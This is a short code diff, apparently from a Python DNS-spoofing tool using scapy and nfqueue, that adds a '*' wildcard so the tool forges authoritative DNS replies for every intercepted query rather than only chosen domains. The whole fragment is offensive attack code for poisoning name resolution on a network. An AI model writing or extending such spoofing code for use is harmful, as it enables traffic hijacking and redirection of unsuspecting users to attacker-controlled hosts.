@@ -61,7 +61,7 @@ def callback(payload):
         payload.set_verdict(nfqueue.NF_ACCEPT)
     else:
         for d in args.domain:
-            if d in pkt[DNS].qd.qname:
+            if d in pkt[DNS].qd.qname or d == '*':
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
